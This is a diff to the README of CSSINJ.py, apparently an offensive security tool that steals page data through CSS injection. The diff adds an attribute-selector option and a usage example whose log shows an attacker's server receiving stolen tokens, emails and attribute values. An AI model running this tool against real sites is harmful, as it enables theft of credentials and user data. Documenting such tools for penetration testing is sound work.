@@ -43,10 +43,13 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 | `-h, --help`           | Show help message and exit                  |
 | `-H, --hostname`       | Attacker hostname or IP address             |
 | `-p, --port`           | Port number of the attacker                 |
-| `-i, --identifier`     | CSS identifier (CSS selector) to extract data |
+| `-i, --identifier`     | CSS identifier to extract data              |
+| `-s, --selector`       | CSS Attribute Selector for exfiltration     |
 | `-d, --details`        | Show detailed logs of the exfiltration process, including extracted data. |
 
 ### Example  
+
+#### Using a specific CSS identifier : 
 
 ```bash
 ~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i input
@@ -59,9 +62,25 @@ python3 CSSINJ.py [-h] -H HOSTNAME -p PORT -i IDENTIFIER
 
 [2025-03-11 02:40:55] 🛠️ Attacker's server started on 127.0.0.1:5005
 [2025-03-11 02:40:56] 🌐 Connection from ::1
-[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : MySecretToken123
-[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin@example.com
+[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : MySecretAdminToken
+[2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin@admin.XX
 [2025-03-11 02:40:56] ✅ The value exfiltrated from input is : admin
+```
+
+#### Using a specific CSS attribute selector and a generic CSS identifier:
+
+```bash
+~ python3 CSSINJ.py -H 127.0.0.1 -p 5005 -i \* -s src
+  _____   _____   _____  _____  _   _       _     _____  __     __
+ / ____| / ____| / ____||_   _|| \ | |     | |   |  __ \ \ \   / /
+| |     | (___  | (___    | |  |  \| |     | |   | |__) | \ \_/ /
+| |      \___ \  \___ \   | |  | . ` | _   | |   |  ___/   \   /
+| |____  ____) | ____) | _| |_ | |\  || |__| | _ | |        | |
+ \_____||_____/ |_____/ |_____||_| \_| \____/ (_)|_|        |_|
+
+[2025-03-11 03:06:49] 🛠️ Attacker's server started on 127.0.0.1:5005
+[2025-03-11 03:06:49] 🌐 Connection from ::1
+[2025-03-11 03:06:49] ✅ The src exfiltrated from * is : XXXXXXXXXXX.XX
 ```
 
 ## Browser-Specific Behavior
